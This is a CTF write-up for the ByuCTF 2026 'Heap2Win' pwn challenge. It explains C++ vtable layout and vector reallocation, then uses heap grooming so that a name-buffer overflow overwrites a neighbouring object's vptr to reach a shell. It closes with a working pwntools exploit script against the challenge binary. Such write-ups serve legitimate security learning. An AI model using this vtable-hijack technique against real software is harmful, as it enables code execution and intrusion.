+++
author = "Velobobo"
title = "ByuCTF 2026 - Heap2Win"
date = "2026-06-11"
description = ""
draft = false
slug = "byu-2026-heap2win"
ctfs = ["Byu-2026"]
tags = [
    "heap",
    "cpp",
    "ctf",
]
categories = [
    "pwn"
]

+++

# Heap2Win - Byu CTF 2026

## Overview 
This challenge revolves around a classic C++ exploitation technique: **vtable hijacking**.  
The binary allocates several C++ objects on the heap and interacts with them through virtual functions.  
you can see the source code of the binary from [here](https://github.com/BYU-CSA/BYUCTF-2026/blob/main/pwn/heap2win/main.cpp)  


{{< figure src="checksec.png" alt="checksec" width="800">}}

{{< figure src="chall.png" alt="chall" width="800" >}}


## Analysis

This binary has 3 classes - hype button , custom button and winner button and all of these have a virtual function `push()` which just prints text for hype,custom btn but calls `system("/bin/sh")` for the winner btn. We are allowed to make hype,custom btns and push them normally but aren't allowed to make a custom btn so we somehow have to call the push() function of the winnerbtn.  

the vuln is inside the custom button where we can overflow name buffer

{{< figure src="vuln1.png" alt="vuln" width="800" >}}

the idea is clear we have to overwrite the `vptr(virtual pointer)` of a btn with the vptr of the winning btn. 

## C++ Mechanics

**--Classes**  
In cpp Classes are just like structs internally , when a `Class` has a virtual functions the struct has a `vptr` field at the start of the struct and then after that all the other fields come. the vptr points to a read only section `.rodata` in memory which contains all the virtual functions for that class sequentially.

The memory layout of a vtable of a Class is like this
```python {linenos=false}
[Vtable]
+0x0: offset-to-top
+0x8: RTTI pointer (type info)
+0x16: Virtual function #1  <----- vptr points to this
+0x20: Virtual function #2
..
..
```

`offset-to-top` is used to adjust the pointer in case of multiple inheritances , in normal non-complex cases its value is usually 0.  
`RTTI` (Run-Time Type Information) points to a section which helps the program know about the type of the object

```python {linenos=false}
[Class Object]
+0x0: vptr ---> custombtn_vtable_functions_section
+0x8: Other fields in the class
```

We cant change the functions inside the vtable itself as it is inside a read only memory but we can change the vptr pointer so that it points to a different table and the program uses this table to call the fucntions.


**--Working of vectors**  

`vector` manages a contiguous memory on the heap. Under the hood, the vector object tracks three pointers on the stack  

begin: Points to the start of the allocated heap array.  
last: Points to the end of the used elements.  
end: Points to the end of the allocated capacity.

And with the pointer arithmetics it manages the size and capacity of the vector. 
when size==capacity , then at the next `vec.push_back()` , it allocates a new memory in heap with `2x` the capacity of the previous one and copies the elements and frees the old heap array.  

The capacity starts at 1 and even though if malloc would return the same size for the new capacity the vector would still relocate and free the old heap chunk cuz vector doesn't know that malloc returned the same number of bytes thats just an optimization of malloc, This can be seen when the code allocates a new btn and does this

```cpp
vector<Button *> button_list;
button_list.push_back(new CustomButton());
``` 

So after the first push_back() size becomes 1 and capacity is also 1 , and the usable_malloc chunk size returned will be 0x10 (cuz its the least usable_malloc size that malloc can return even if we requested for 8 bytes ) which can fit 2 pointers but when the next pushback happens it sees that capacity=size then it frees the old heapchunk and makes another one with capacity `2*1=2` and still the malloc will return a chunk of usable_size 0x10 . so this freeing and allocating is happening whenever the capacity=size not according to how much space is actually in the malloc chunk.

By filling vectors and forcing them to reallocate, we can intentionally free up chunks of memory of known sizes.

## Heap Grooming & Exploitation

Gdb outputs of heap chunks when i sequentially make new CustomBtns 

{{< figure src="gdb1.png" alt="gdb1" width="800">}}

{{< figure src="gdb2.png" alt="gdb2" width="800" >}}

{{< figure src="gdb3.png" alt="gdb3" width="800" >}}

Due to tcache reuse by malloc on the freed chunk of vector the 3rd custombtn gets allocated before the 2nd custom btn in the memory and we can overflow the name buffer of the 3rd chunk and overwrite the vptr of the 2nd chunk with the vptr of the Winning_btn class, so that when we call push() from the #2 custom btn we will get the shell.

From ghidra/objdump we get `Winningbtn_vptr: 0x403640` 

## Exploit script

```python
from pwn import *
binary='./heap2win'
elf = context.binary = ELF(binary, checksec=False)
p=process(binary)

def make_btn(content):
    p.sendlineafter(b'>> ','1')
    p.sendlineafter(b'>> Enter your choice (1-3): ','2')
    p.sendlineafter(b'Enter the name for your custom button!',content)

winnerptr=0x403640
payload=b'C'*0x18+p64(winnerptr)

make_btn(b'AAAAA')
make_btn(b'BBBBB')
make_btn(payload)
p.send(b'2\n2\n')
p.interactive()
```

{{< figure src="flag.png" alt="flag" width="800" >}}
